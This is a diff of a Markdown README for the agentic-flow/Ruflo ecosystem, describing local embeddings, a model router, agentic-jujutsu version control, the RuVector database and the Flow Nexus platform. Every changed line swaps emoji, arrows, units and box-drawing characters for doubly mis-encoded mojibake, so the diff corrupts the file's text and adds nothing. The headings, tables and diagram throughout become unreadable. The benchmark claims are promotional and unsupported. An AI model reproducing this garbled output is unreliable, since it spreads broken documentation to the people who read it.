+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂÃ‚Â¢ <strong>ONNX Embeddings</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â 75x Faster Local Vectors</summary>
 
 Generate embeddings locally without API calls:
 
@@ -4994,14 +4994,14 @@ const similarity = cosineSimilarity(vectors[0], vectors[1]);
 
 | Provider | Latency | Cost | Offline |
 |----------|---------|------|---------|
-| **Agentic-Flow ONNX** | ~3ms | Free | Ã¢Å“â€¦ |
-| Transformers.js | ~230ms | Free | Ã¢Å“â€¦ |
-| OpenAI | ~50-100ms | $0.02-0.13/1M | Ã¢ÂÅ’ |
+| **Agentic-Flow ONNX** | ~3ms | Free | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ |
+| Transformers.js | ~230ms | Free | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ |
+| OpenAI | ~50-100ms | $0.02-0.13/1M | ÃƒÂ¢Ã‚ÂÃ…â€™ |
 
 </details>
 
 <details>
-<summary>Ã°Å¸â€œÂ <strong>Embedding Geometry</strong> Ã¢â‚¬â€ Intelligence as Geometry</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã‚Â <strong>Embedding Geometry</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Intelligence as Geometry</summary>
 
 Advanced patterns treating embeddings as geometric control surfaces:
 
@@ -5052,7 +5052,7 @@ if (result.anomalyScore > 1.5) {
 </details>
 
 <details>
-<summary>Ã°Å¸â€â‚¬ <strong>Multi-Model Router</strong> Ã¢â‚¬â€ Intelligent Model Selection</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂÃ¢â€šÂ¬ <strong>Multi-Model Router</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Intelligent Model Selection</summary>
 
 Route tasks to optimal models based on complexity:
 
@@ -5076,7 +5076,7 @@ const result2 = await router.route({
 
 | Complexity | Model | Cost | Use Case |
 |------------|-------|------|----------|
-| Agent Booster intent | **Skip LLM** | $0 | varÃ¢â€ â€™const, add-types |
+| Agent Booster intent | **Skip LLM** | $0 | varÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢const, add-types |
 | Low (<30%) | **Haiku** | $0.0002 | Simple fixes, docs |
 | Medium (30-70%) | **Sonnet** | $0.003 | Features, debugging |
 | High (>70%) | **Opus** | $0.015 | Architecture, security |
@@ -5086,7 +5086,7 @@ const result2 = await router.route({
 </details>
 
 <details>
-<summary>Ã°Å¸Å¡â‚¬ <strong>CLI Commands</strong> Ã¢â‚¬â€ Full agentic-flow CLI</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã…Â¡Ã¢â€šÂ¬ <strong>CLI Commands</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Full agentic-flow CLI</summary>
 
 ```bash
 # Agent Booster
@@ -5118,7 +5118,7 @@ npx agentic-flow mcp stdio
 </details>
 
 <details>
-<summary>Ã°Å¸â€Â§ <strong>MCP Tools</strong> Ã¢â‚¬â€ 313 Integration Tools</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂÃ‚Â§ <strong>MCP Tools</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â 313 Integration Tools</summary>
 
 The agentic-flow ecosystem exposes MCP tools across packages (ruflo CLI provides 314 tools):
 
@@ -5137,7 +5137,7 @@ The agentic-flow ecosystem exposes MCP tools across packages (ruflo CLI provides
 npx agentic-flow mcp start
 
 # Add to Claude Code
-# agentic-flow MCP server (optional) â€” add to .cursor/mcp.json if needed
+# agentic-flow MCP server (optional) Ã¢â‚¬â€ add to .cursor/mcp.json if needed
 ```
 
 </details>
@@ -5175,7 +5175,7 @@ const config = optimizer.getOptimalConfig(agentCount);
 ---
 
 <details>
-<summary>Ã°Å¸Â¥â€¹ <strong>Agentic-Jujutsu</strong> Ã¢â‚¬â€ Self-Learning AI Version Control</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã‚Â¥Ã¢â‚¬Â¹ <strong>Agentic-Jujutsu</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Self-Learning AI Version Control</summary>
 
 [![npm version](https://img.shields.io/npm/v/agentic-jujutsu?color=blue&label=npm)](https://www.npmjs.com/package/agentic-jujutsu)
 [![npm downloads](https://img.shields.io/npm/dm/agentic-jujutsu?color=green)](https://www.npmjs.com/package/agentic-jujutsu)
@@ -5206,18 +5206,18 @@ npx agentic-jujutsu compare-git
 
 | What | Git | Agentic-Jujutsu |
 |------|-----|-----------------|
-| **Multiple AIs working together** | Ã¢ÂÅ’ Locks & conflicts | Ã¢Å“â€¦ Works smoothly |
+| **Multiple AIs working together** | ÃƒÂ¢Ã‚ÂÃ…â€™ Locks & conflicts | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ Works smoothly |
 | **Speed with 3+ agents** | Slow (waits) | **23x faster** |
 | **Installation** | Need to install git | One npm command |
 | **AI integration** | Manual work | Built-in (MCP protocol) |
-| **Self-learning capabilities** | Ã¢ÂÅ’ None | Ã¢Å“â€¦ ReasoningBank |
+| **Self-learning capabilities** | ÃƒÂ¢Ã‚ÂÃ…â€™ None | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ ReasoningBank |
 | **Automatic conflict resolution** | 30-40% auto | **87% auto** |
 | **Cryptographic security** | Basic | SHA3-512 fingerprints |
 
 ### Core Capabilities
 
 <details>
-<summary>Ã°Å¸Â§Â  <strong>Self-Learning with ReasoningBank</strong> Ã¢â‚¬â€ Track operations, learn patterns, get AI suggestions</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã‚Â§Ã‚Â  <strong>Self-Learning with ReasoningBank</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Track operations, learn patterns, get AI suggestions</summary>
 
 ```javascript
 const { JjWrapper } = require('agentic-jujutsu');
@@ -5258,7 +5258,7 @@ console.log('Confidence:', (suggestion.confidence * 100).toFixed(1) + '%');
 </details>
 
 <details>
-<summary>Ã°Å¸Â¤Â <strong>Multi-Agent Coordination</strong> Ã¢â‚¬â€ DAG architecture for conflict-free collaboration</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã‚Â¤Ã‚Â <strong>Multi-Agent Coordination</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â DAG architecture for conflict-free collaboration</summary>
 
 ```javascript
 // All agents work concurrently (no conflicts!)
@@ -5293,13 +5293,13 @@ console.log('All agents completed:', results);
 | Concurrent commits | 15 ops/s | **350 ops/s (23x)** |
 | Context switching | 500-1000ms | **50-100ms (10x)** |
 | Conflict resolution | 30-40% auto | **AI-assisted (via agentic-jujutsu)** |
-| Lock waiting | 50 min/day | **0 min (Ã¢Ë†Å¾)** |
+| Lock waiting | 50 min/day | **0 min (ÃƒÂ¢Ã‹â€ Ã…Â¾)** |
 | SHA3-512 fingerprints | N/A | **<1ms** |
 
 </details>
 
 <details>
-<summary>Ã°Å¸â€Â <strong>Cryptographic Security</strong> Ã¢â‚¬â€ SHA3-512 fingerprints and AES-256 encryption</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂÃ‚Â <strong>Cryptographic Security</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â SHA3-512 fingerprints and AES-256 encryption</summary>
 
 ```javascript
 const { generateQuantumFingerprint, verifyQuantumFingerprint } = require('agentic-jujutsu');
@@ -5341,12 +5341,12 @@ Ruflo includes a dedicated `/agentic-jujutsu` skill for AI-powered version contr
 ```
 
 **Use this skill when you need:**
-- Ã¢Å“â€¦ Multiple AI agents modifying code simultaneously
-- Ã¢Å“â€¦ Lock-free version control (faster than Git for concurrent agents)
-- Ã¢Å“â€¦ Self-learning AI that improves from experience
-- Ã¢Å“â€¦ SHA3-512 cryptographic integrity verification
-- Ã¢Å“â€¦ Automatic conflict resolution (87% success rate)
-- Ã¢Å“â€¦ Pattern recognition and intelligent suggestions
+- ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ Multiple AI agents modifying code simultaneously
+- ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ Lock-free version control (faster than Git for concurrent agents)
+- ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ Self-learning AI that improves from experience
+- ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ SHA3-512 cryptographic integrity verification
+- ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ Automatic conflict resolution (87% success rate)
+- ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ Pattern recognition and intelligent suggestions
 
 ### MCP Tools for AI Agents
 
@@ -5409,7 +5409,7 @@ npx agentic-jujutsu examples        # Show usage examples
 ---
 
 <details>
-<summary>Ã°Å¸Â¦â‚¬ <strong>RuVector</strong> Ã¢â‚¬â€ High-Performance Rust/WASM Intelligence</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã‚Â¦Ã¢â€šÂ¬ <strong>RuVector</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â High-Performance Rust/WASM Intelligence</summary>
 
 [![npm version](https://img.shields.io/npm/v/ruvector?color=blue&label=npm)](https://www.npmjs.com/package/ruvector)
 [![npm downloads](https://img.shields.io/npm/dm/ruvector?color=green)](https://www.npmjs.com/package/ruvector)
@@ -5422,7 +5422,7 @@ npx agentic-jujutsu examples        # Show usage examples
 
 | Capability | Description | Performance |
 |------------|-------------|-------------|
-| **Vector Search** | HNSW indexing with SIMD acceleration | **~61Ã‚Âµs latency, 16,400 QPS** |
+| **Vector Search** | HNSW indexing with SIMD acceleration | **~61Ãƒâ€šÃ‚Âµs latency, 16,400 QPS** |
 | **Graph Queries** | Full Cypher syntax (MATCH, WHERE, CREATE) | Native graph traversal |
 | **Self-Learning** | GNN layers that improve search over time | Automatic optimization |
 | **Distributed** | Raft consensus, multi-master replication | Auto-sharding |
@@ -5433,11 +5433,11 @@ npx agentic-jujutsu examples        # Show usage examples
 
 | Operation | Latency | Throughput |
 |-----------|---------|------------|
-| HNSW Search (k=10, 384-dim) | **61Ã‚Âµs** | 16,400 QPS |
-| HNSW Search (k=100) | 164Ã‚Âµs | 6,100 QPS |
+| HNSW Search (k=10, 384-dim) | **61Ãƒâ€šÃ‚Âµs** | 16,400 QPS |
+| HNSW Search (k=100) | 164Ãƒâ€šÃ‚Âµs | 6,100 QPS |
 | Cosine Distance (1536-dim) | 143ns | 7M ops/sec |
 | Dot Product (384-dim) | 33ns | 30M ops/sec |
-| Batch Distance (1000 vectors) | 237Ã‚Âµs | 4.2M/sec |
+| Batch Distance (1000 vectors) | 237Ãƒâ€šÃ‚Âµs | 4.2M/sec |
 | Memory (1M vectors with PQ8) | - | **200MB** |
 
 ### Quick Start
@@ -5492,7 +5492,7 @@ const compressed = ruvector.compress(embedding, 0.3); // 30% quality threshold
 | **[@ruvector/rvlite](https://www.npmjs.com/package/@ruvector/rvlite)** | Standalone DB (SQL, SPARQL, Cypher) | All-in-one solution |
 | **[@ruvector/router](https://www.npmjs.com/package/@ruvector/router)** | Semantic intent routing | Fast routing |
 
-### Ã°Å¸ÂËœ RuVector PostgreSQL Ã¢â‚¬â€ Enterprise Vector Database
+### ÃƒÂ°Ã…Â¸Ã‚ÂÃ‹Å“ RuVector PostgreSQL ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Enterprise Vector Database
 
 **77+ SQL functions** for AI operations directly in PostgreSQL with fast vector search.
 
@@ -5519,14 +5519,14 @@ npx ruflo ruvector import --input memory-export.json
 | Feature | pgvector | RuVector PostgreSQL |
 |---------|----------|---------------------|
 | **SQL Functions** | ~10 basic | **77+ comprehensive** |
-| **Search Latency** | ~1ms | **~61Ã‚Âµs** |
+| **Search Latency** | ~1ms | **~61Ãƒâ€šÃ‚Âµs** |
 | **Throughput** | ~5K QPS | **16,400 QPS** |
-| **Attention Mechanisms** | Ã¢ÂÅ’ None | **Ã¢Å“â€¦ 39 types (self, multi-head, cross)** |
-| **GNN Operations** | Ã¢ÂÅ’ None | **Ã¢Å“â€¦ GAT, message passing** |
-| **Hyperbolic Embeddings** | Ã¢ÂÅ’ None | **Ã¢Å“â€¦ PoincarÃƒÂ©/Lorentz space** |
-| **Hybrid Search** | Ã¢ÂÅ’ Manual | **Ã¢Å“â€¦ BM25/TF-IDF built-in** |
-| **Local Embeddings** | Ã¢ÂÅ’ None | **Ã¢Å“â€¦ 6 fastembed models** |
-| **Self-Learning** | Ã¢ÂÅ’ None | **Ã¢Å“â€¦ GNN-based optimization** |
+| **Attention Mechanisms** | ÃƒÂ¢Ã‚ÂÃ…â€™ None | **ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ 39 types (self, multi-head, cross)** |
+| **GNN Operations** | ÃƒÂ¢Ã‚ÂÃ…â€™ None | **ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ GAT, message passing** |
+| **Hyperbolic Embeddings** | ÃƒÂ¢Ã‚ÂÃ…â€™ None | **ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ PoincarÃƒÆ’Ã‚Â©/Lorentz space** |
+| **Hybrid Search** | ÃƒÂ¢Ã‚ÂÃ…â€™ Manual | **ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ BM25/TF-IDF built-in** |
+| **Local Embeddings** | ÃƒÂ¢Ã‚ÂÃ…â€™ None | **ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ 6 fastembed models** |
+| **Self-Learning** | ÃƒÂ¢Ã‚ÂÃ…â€™ None | **ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ GNN-based optimization** |
 | **SIMD Optimization** | Basic | **AVX-512/AVX2/NEON (~2x faster)** |
 
 **Key SQL Functions:**
@@ -5555,7 +5555,7 @@ SELECT cosine_similarity_arr(a, b) AS similarity;
 | **AI Operations** | External only | **In-database (attention, GNN)** |
 
 <details>
-<summary>Ã¢Å¡Â¡ <strong>@ruvector/attention</strong> Ã¢â‚¬â€ Flash Attention (2.49x-7.47x Speedup)</summary>
+<summary>ÃƒÂ¢Ã…Â¡Ã‚Â¡ <strong>@ruvector/attention</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Flash Attention (2.49x-7.47x Speedup)</summary>
 
 Native Rust implementation of Flash Attention for transformer computations:
 
@@ -5569,7 +5569,7 @@ const attention = new FlashAttention({
   useCPUOptimizations: true
 });
 
-// Compute attention with O(N) memory instead of O(NÃ‚Â²)
+// Compute attention with O(N) memory instead of O(NÃƒâ€šÃ‚Â²)
 const result = attention.attention(queries, keys, values);
 console.log(`Computed in ${result.computeTimeMs}ms`);
 
@@ -5589,7 +5589,7 @@ console.log(`Memory reduction: ${bench.memoryReduction}x`);
 </details>
 
 <details>
-<summary>Ã°Å¸Â§Â  <strong>@ruvector/sona</strong> Ã¢â‚¬â€ Self-Optimizing Pattern Learning</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã‚Â§Ã‚Â  <strong>@ruvector/sona</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Self-Optimizing Pattern Learning</summary>
 
 SONA provides runtime-adaptive learning with minimal overhead:
 
@@ -5631,7 +5631,7 @@ await sona.consolidate();
 </details>
 
 <details>
-<summary>Ã°Å¸â€œÅ  <strong>@ruvector/graph-node</strong> Ã¢â‚¬â€ Native Graph Database</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã…Â  <strong>@ruvector/graph-node</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Native Graph Database</summary>
 
 High-performance graph database with Cypher query support:
 
@@ -5713,22 +5713,22 @@ npx ruvector benchmark --vectors 10000 --dimensions 384
 **Generated Setup Files:**
 ```
 ruvector-postgres/
-Ã¢â€Å“Ã¢â€â‚¬Ã¢â€â‚¬ docker-compose.yml    # Docker services (PostgreSQL + pgAdmin)
-Ã¢â€Å“Ã¢â€â‚¬Ã¢â€â‚¬ README.md             # Quick start guide
-Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬ scripts/
-    Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬ init-db.sql       # Database initialization (tables, indexes, functions)
+ÃƒÂ¢Ã¢â‚¬ÂÃ…â€œÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ docker-compose.yml    # Docker services (PostgreSQL + pgAdmin)
+ÃƒÂ¢Ã¢â‚¬ÂÃ…â€œÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ README.md             # Quick start guide
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ scripts/
+    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ init-db.sql       # Database initialization (tables, indexes, functions)
 ```
 
 </details>
 
 ---
 
-## Ã¢ËœÂÃ¯Â¸Â Cloud & Deployment
+## ÃƒÂ¢Ã‹Å“Ã‚ÂÃƒÂ¯Ã‚Â¸Ã‚Â Cloud & Deployment
 
 Cloud platform integration and deployment tools.
 
 <details>
-<summary>Ã¢ËœÂÃ¯Â¸Â <strong>Flow Nexus</strong> Ã¢â‚¬â€ Cloud Platform Integration</summary>
+<summary>ÃƒÂ¢Ã‹Å“Ã‚ÂÃƒÂ¯Ã‚Â¸Ã‚Â <strong>Flow Nexus</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Cloud Platform Integration</summary>
 
 Flow Nexus is a **cloud platform** for deploying and scaling Ruflo beyond your local machine.
 
@@ -5745,27 +5745,27 @@ Flow Nexus is a **cloud platform** for deploying and scaling Ruflo beyond your l
 ### Core Capabilities
 
 ```
-Ã¢â€Å’Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â
-Ã¢â€â€š                      FLOW NEXUS PLATFORM                            Ã¢â€â€š
-Ã¢â€Å“Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â¤
-Ã¢â€â€š                                                                     Ã¢â€â€š
-Ã¢â€â€š  Ã¢â€Å’Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â  Ã¢â€Å’Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â  Ã¢â€Å’Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â                 Ã¢â€â€š
-Ã¢â€â€š  Ã¢â€â€š   Swarm     Ã¢â€â€š  Ã¢â€â€š   Neural    Ã¢â€â€š  Ã¢â€â€š  Sandboxes  Ã¢â€â€š                 Ã¢â€â€š
-Ã¢â€â€š  Ã¢â€â€š   Cloud     Ã¢â€â€š  Ã¢â€â€š   Training  Ã¢â€â€š  Ã¢â€â€š   (E2B)     Ã¢â€â€š                 Ã¢â€â€š
-Ã¢â€â€š  Ã¢â€â€š             Ã¢â€â€š  Ã¢â€â€š             Ã¢â€â€š  Ã¢â€â€š             Ã¢â€â€š                 Ã¢â€â€š
-Ã¢â€â€š  Ã¢â€â€š Scale to    Ã¢â€â€š  Ã¢â€â€š Distributed Ã¢â€â€š  Ã¢â€â€š Isolated    Ã¢â€â€š                 Ã¢â€â€š
-Ã¢â€â€š  Ã¢â€â€š 100+ agents Ã¢â€â€š  Ã¢â€â€š GPU trainingÃ¢â€â€š  Ã¢â€â€š code exec   Ã¢â€â€š                 Ã¢â€â€š
-Ã¢â€â€š  Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Ëœ  Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Ëœ  Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Ëœ                 Ã¢â€â€š
-Ã¢â€â€š                                                                     Ã¢â€â€š
-Ã¢â€â€š  Ã¢â€Å’Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â  Ã¢â€Å’Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â  Ã¢â€Å’Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â                 Ã¢â€â€š
-Ã¢â€â€š  Ã¢â€â€š   App       Ã¢â€â€š  Ã¢â€â€š  Workflows  Ã¢â€â€š  Ã¢â€â€š Challenges  Ã¢â€â€š                 Ã¢â€â€š
-Ã¢â€â€š  Ã¢â€â€š   Store     Ã¢â€â€š  Ã¢â€â€š  (Events)   Ã¢â€â€š  Ã¢â€â€š & Rewards   Ã¢â€â€š                 Ã¢â€â€š
-Ã¢â€â€š  Ã¢â€â€š             Ã¢â€â€š  Ã¢â€â€š             Ã¢â€â€š  Ã¢â€â€š             Ã¢â€â€š                 Ã¢â€â€š
-Ã¢â€â€š  Ã¢â€â€š Publish &   Ã¢â€â€š  Ã¢â€â€š Event-drivenÃ¢â€â€š  Ã¢â€â€š Gamified    Ã¢â€â€š                 Ã¢â€â€š
-Ã¢â€â€š  Ã¢â€â€š discover    Ã¢â€â€š  Ã¢â€â€š automation  Ã¢â€â€š  Ã¢â€â€š learning    Ã¢â€â€š                 Ã¢â€â€š
-Ã¢â€â€š  Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Ëœ  Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Ëœ  Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Ëœ                 Ã¢â€â€š
-Ã¢â€â€š                                                                     Ã¢â€â€š
